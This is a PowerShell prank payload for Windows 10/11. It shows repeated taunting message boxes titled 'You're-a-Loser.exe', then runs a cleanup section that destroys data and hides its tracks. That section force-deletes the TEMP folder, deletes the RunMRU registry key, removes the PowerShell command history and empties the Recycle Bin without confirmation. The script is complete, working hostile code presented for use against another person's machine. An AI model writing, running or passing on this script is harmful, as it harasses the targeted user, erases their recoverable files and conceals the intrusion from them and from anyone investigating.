                 
#         _     __          
#      __| |   / _ \     ___     __ _    _   _ 
#     / _  |  | | | |   / _ \   / _` |  \  \/ /
#    | (_| |  | |_| |  | (_    | (_| |   >   <
#     \____|   \___/    \___/   \__,_|  /_ /\_\
#                                        
# if the truth shall kill them 
#    let them die
#
# targets windows 10/11 
#
#------------------------------------------------------------------------------------------------------------------------------------

Add-Type -AssemblyName System.Windows.Forms

$cycles = 3    #number of time the program will cycle before shutting

$msgs = @(
"Enter question here"    #type 4 different questions you would like to have appear in yourealoser.exe
"Enter question here"
"Enter question here"
"Enter question here"
)

for ($i=1; $i -le $cycles; $i++) {

Foreach ($msg in $msgs) {
[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
}
}

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
